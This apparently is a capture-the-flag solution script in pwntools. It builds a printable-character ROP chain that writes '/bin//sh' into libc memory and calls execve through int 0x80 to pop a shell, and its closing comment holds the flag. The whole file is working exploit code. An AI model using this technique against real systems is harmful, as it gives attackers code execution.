from pwn import *

base = 0x5555e000
garbage = 'a' * (0x1c + 4)

#WRITE BASH STRING
#libc address to write to: 0x15742a
#0x00095555: pop edx; xor eax, eax; pop edi; ret; //POP EDX, POP EDI
#0x000d7738: mov dword ptr [edx], ecx; pop ebx; ret;  //MOV PTR, POP EBX
#0x00174a51: pop ecx; add al, 0xa; ret;  //POP EXC
write_addr = p32(base + 0x15742a) #0x556b542a
write_addr2 = p32(base + 0x15742a + 4)

pop_edx = p32(base + 0x95555)
pop_ecx = p32(base + 0x174a51)
mov_ptr = p32(base + 0xd7738) + 'aaaa'

write_sh_str = pop_edx + write_addr + 'aaaa' + pop_ecx + '/bin' + mov_ptr + pop_edx + write_addr2 + 'aaaa' + pop_ecx + '//sh' + mov_ptr


#SET EBX TO ADDRESS OF STRING
#0x00198c4e: pop ebx; ret; 
ebx_binsh = p32(base + 0x198c4e) + write_addr

#SET ECX TO ADDRESS OF PTR TO STRING. CHANGES EAX, EBX
ptr_addr = p32(base + 0x15742a - 8)
ecx_binshptr = pop_edx + ptr_addr + 'aaaa' + pop_ecx + write_addr + mov_ptr + pop_ecx + ptr_addr


#SET EDX TO 0. CHANGES EAX
#0xb9940: mov edx, 0xffffffff; cmovnz eax, edx; ret;        #cmovnz: mov if ZF not set
#0x89a4b: inc edx; add al, 0x5f; ret;
edx_0 = p32(base + 0xb9940) + p32(base + 0x89a4b)

#SET EAX TO 11
#0xd9370: xor eax, eax; ret;
#0x149222: add eax, 0xb; pop edi; ret; 
eax_11 = p32(base + 0xd9370) + p32(base + 0x149222) + p32(0x41414141)

#INT 80h
int_80 = p32(0x55667176)

#build payload
payload = garbage + write_sh_str + ecx_binshptr + edx_0 + eax_11 + ebx_binsh + int_80

#Assert that all characters are printable
for c in payload:
    num = ord(c)
    if num < 0x20 or num > 0x7f:
        print(c)
    #assert num >= 0x20 and num <= 0x7f


print(payload) #flag: damn you ascii armor... what a pain in the ass!! :(
